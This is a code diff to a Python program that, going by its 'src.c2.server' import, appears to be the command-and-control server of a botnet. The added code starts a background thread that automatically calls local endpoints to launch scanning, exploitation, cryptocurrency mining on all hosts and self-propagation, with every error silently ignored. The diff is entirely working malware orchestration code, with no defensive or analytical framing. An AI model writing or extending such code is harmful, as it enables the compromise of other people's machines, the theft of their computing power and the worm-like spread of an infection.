@@ -139,6 +139,30 @@ def main():
     log.success("Server configuration ready")
     log.info("Starting server...")
     
+    # Auto-start operations after server starts
+    def auto_start_operations():
+        time.sleep(8)  # Wait for server and WebSocket ready
+        log.info("Auto-starting operations...")
+        try:
+            requests.post(f'http://127.0.0.1:{args.port}/api/exploitation/scan', timeout=5)
+            log.info("✓ Scan started")
+        except: pass
+        try:
+            requests.post(f'http://127.0.0.1:{args.port}/api/exploitation/exploit', timeout=5)
+            log.info("✓ Exploit started")
+        except: pass
+        try:
+            requests.post(f'http://127.0.0.1:{args.port}/api/mining/start-all', timeout=5)
+            log.info("✓ Mining started")
+        except: pass
+        try:
+            requests.post(f'http://127.0.0.1:{args.port}/api/propagation/start', timeout=5)
+            log.info("✓ Propagation started")
+        except: pass
+        log.success("All operations auto-started")
+    
+    threading.Thread(target=auto_start_operations, daemon=True).start()
+    
     try:
         from src.c2.server import socketio
         socketio.run(app, host=args.host, port=args.port, debug=args.debug)
